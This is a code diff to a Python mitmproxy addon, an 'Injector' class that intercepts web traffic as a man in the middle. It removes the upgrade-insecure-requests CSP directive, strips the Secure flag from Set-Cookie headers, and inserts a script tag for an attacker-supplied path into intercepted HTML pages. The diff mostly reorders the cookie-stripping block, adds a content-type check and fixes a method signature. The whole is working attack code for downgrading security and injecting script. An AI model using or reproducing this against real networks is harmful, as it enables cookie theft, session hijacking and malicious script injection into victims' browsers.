@@ -38,25 +38,30 @@ class Injector:
             csp = flow.response.headers['Content-Security-Policy']
             flow.response.headers['Content-Security-Policy'] = re.sub('upgrade-insecure-requests[;\s]*', '', csp, flags=re.IGNORECASE)
 
-        # strip secure flag from 'Set-Cookie' headers
-        cookies = flow.response.headers.get_all('Set-Cookie')
-        cookies = [re.sub(r';\s*secure\s*', '', s) for s in cookies]
-        flow.response.headers.set_all('Set-Cookie', cookies)
         if self.path:
             html = BeautifulSoup(flow.response.content, "html.parser")
-            print(self.path)
-            print(flow.response.headers["content-type"])
-            if flow.response.headers["content-type"] == 'text/html':
-                print(flow.response.headers["content-type"])
+            #print(self.path)
+            #print(flow.response.headers)
+            if 'content-type' in flow.response.headers and flow.response.headers["content-type"] == 'text/html':
+                #print(flow.response.headers["content-type"])
                 script = html.new_tag(
                     "script",
                     src=self.path,
                     type='application/javascript')
                 html.body.insert(0, script)
                 flow.response.content = str(html).encode("utf8")
-                print("Script injected.")
+                print("\nScript injected.\n\n")
+            else:
+                print("\nWrong content type. Sorry\n\n")
 
-    def request(flow):
+
+        # strip secure flag from 'Set-Cookie' headers
+        cookies =  flow.response.headers.get_all('Set-Cookie')
+        cookies = [re.sub(r';\s*secure\s*', '', s) for s in cookies]
+        flow.response.headers.set_all('Set-Cookie', cookies)
+
+
+    def request(self, flow):
         flow.request.headers.pop('If-Modified-Since', None)
         flow.request.headers.pop('Cache-Control', None)
 
